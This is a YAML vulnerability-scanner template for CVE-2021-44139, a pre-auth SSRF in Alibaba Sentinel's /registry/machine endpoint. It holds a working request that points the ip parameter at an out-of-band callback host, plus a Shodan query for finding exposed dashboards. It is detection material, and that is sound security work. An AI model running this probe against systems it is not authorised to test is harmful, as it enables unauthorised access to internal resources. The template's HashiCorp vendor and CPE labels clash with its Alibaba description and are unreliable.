http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    part: body
    type: word
    words:
    - '"success":true'
    - '"msg":"success"'
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/registry/machine?app={{rand_base(5)}}&appType=0&version=0&hostname={{rand_base(5)}}&ip={{interactsh-url}}&port=0'
id: CVE-2021-44139
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:hashicorp:sentinel:1.8.2:*:*:*:*:*:*:*
    cve-id: CVE-2021-44139
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-918
    epss-percentile: 0.84732
    epss-score: 0.01355
  description: 'There is a Pre-Auth SSRF vulnerability in Alibaba Sentinel version
    1.8.2, which allows remote unauthenticated attackers to perform SSRF attacks via
    the /registry/machine endpoint through the ip parameter.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    send crafted requests from the server, potentially leading to unauthorized access
    to internal resources or network scanning.

    '
  metadata:
    max-request: 1
    product: sentinel
    shodan-query: title:"Sentinel Dashboard"
    vendor: hashicorp
  name: Alibaba Sentinel - Server-side request forgery (SSRF)
  reference:
  - https://github.com/alibaba/Sentinel/issues/2451
  remediation: 'Apply the latest security patches or updates provided by Alibaba Sentinel
    to fix the SSRF vulnerability (CVE-2021-44139).

    '
  severity: high
  tags: cve,cve2021,ssrf,alibaba,oast,misconfig,sentinel,hashicorp
